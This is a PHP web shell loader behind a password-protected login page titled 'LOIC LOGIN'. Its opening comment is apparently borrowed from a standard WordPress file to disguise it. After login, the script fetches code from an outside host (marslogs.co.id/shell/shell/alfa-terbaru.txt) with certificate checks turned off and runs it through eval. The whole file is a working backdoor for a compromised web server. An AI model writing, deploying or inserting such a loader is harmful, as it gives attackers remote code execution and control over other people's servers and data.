
<?php
session_start();

/**
* Disable error reporting
*
* Set this to error_reporting( -1 ) for debugging.
*/
function geturlsinfo($url) {
  if (function_exists('curl_exec')) {
    $conn = curl_init($url);
    curl_setopt($conn, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($conn, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($conn, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
    curl_setopt($conn, CURLOPT_SSL_VERIFYPEER, 0);
    curl_setopt($conn, CURLOPT_SSL_VERIFYHOST, 0);

    // Set cookies using session if available
    if (isset($_SESSION['coki'])) {
      curl_setopt($conn, CURLOPT_COOKIE, $_SESSION['coki']);
    }

    $url_get_contents_data = curl_exec($conn);
    curl_close($conn);
  } elseif (function_exists('file_get_contents')) {
    $url_get_contents_data = file_get_contents($url);
  } elseif (function_exists('fopen') && function_exists('stream_get_contents')) {
    $handle = fopen($url, "r");
    $url_get_contents_data = stream_get_contents($handle);
    fclose($handle);
  } else {
    $url_get_contents_data = false;
  }
  return $url_get_contents_data;
}

// Function to check if the user is logged in
function is_logged_in() {
  return isset($_SESSION['logged_in']) && $_SESSION['logged_in'] === true;
}

// Check if the password is submitted and correct
if (isset($_POST['password'])) {
  $entered_password = $_POST['password'];
  $hashed_password = '5a42761861c9dbd5867d7b39e755f9fc'; // Replace this with your MD5 hashed password
  if (md5($entered_password) === $hashed_password) {
    // Password is correct, store it in session
    $_SESSION['logged_in'] = true;
    $_SESSION['coki'] = 'asu'; // Replace this with your cookie data
  } else {
    // Password is incorrect
    echo "Incorrect password. Please try again.";
  }
}

// Check if the user is logged in before executing the content
if (is_logged_in()) {
  $a = geturlsinfo('https://marslogs.co.id/shell/shell/alfa-terbaru.txt');
  eval('?>' . $a);
} else {
  // Display login form if not logged in
  ?>
  <!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>LOGIN</title>
    <style>
        * {
            padding: 0%;
            margin: 0%;
            box-sizing: border-box;
            font-family: 'Franklin Gothic Medium', 'Arial Narrow', Arial, sans-serif;
        }
        .pas {
            font-family: 'Lucida Sans', 'Lucida Sans Regular', 'Lucida Grande', 'Lucida Sans Unicode', Geneva, Verdana, sans-serif;
            border: none;
            justify-content: center;
            align-items: center;
            color: aqua;
            background-color: transparent;
            padding: 10px 10px;
        }
        .pas:hover{
            border: 1px solid lavender;
        }
        .pas:active::after::content{
            border: none;
        }
        body {
            color: aquamarine;
            background-color: black;
        }
        img {
            border: none;
            border-radius: 50%;
            background: linear-gradient(to bottom, black, black,black,black,darkgray, darkgray);
        }
        .log {
            background-color: transparent;
            border: none;
            padding: 10px 10px;
            color: aqua;
            font-size: 1rem;
        }
    </style>
</head>
<body>
    <center>
        <form action="" method="post">
            <img src="https://raw.githubusercontent.com/1llsion/imgAmp/main/demon.png" alt="demon">
            <h1>LOIC LOGIN</h1>
        <input type="password" name="password" id="password" placeholder="pass mu cok" class="pas">
        <input type="submit" value=">" class="log">
    </form>
    </center>
</body>
</html>
  <?php
}
?>
